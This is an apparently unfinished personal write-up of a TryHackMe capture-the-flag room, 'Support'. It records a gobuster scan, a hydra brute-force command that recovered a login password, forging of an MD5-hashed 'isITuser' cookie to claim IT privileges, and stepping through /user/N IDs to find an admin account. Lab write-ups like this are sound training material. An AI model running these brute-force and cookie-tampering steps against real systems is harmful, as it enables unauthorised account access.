---
title: THM Challenge "Support" Writeup
---
gobuster dir -u [http://10.48.176.126/](http://10.48.176.126/) -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 50

curl -i -X OPTIONS [http://10.48.176.126/](http://10.48.176.126/)

info.php, /includes, /skins/default.php, 

curl -si [http://10.49.187.109/](http://10.48.176.126/) -d "email=help@support.thm&password=wrongpass" | head -30

This worked:

```
hydra -l help@support.thm -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt 10.49.187.109 http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -w 1 -f -V -o found.txt
```

![image.png](/assets/images/image-4.png)

I found it!! The password for help@support.thm is "snoopy". So freaking exciting, and cookie value "isITuser" is MD5 hashed value of "false" for help@support.thm, so I will use MD5 hashed value for "true" and replace that in "isITuser" value. "b326b5062b2f0e69046810717534cb09", and I thought I would get admin  it went to /api.php

![image.png](/assets/images/image-1.png)

There I can go to /user/3

![image.png](/assets/images/image-2.png)

Then I know that it is not admin account, so I will go to /user/1

![image.png](/assets/images/image-3.png)

I will try with hydra again for login

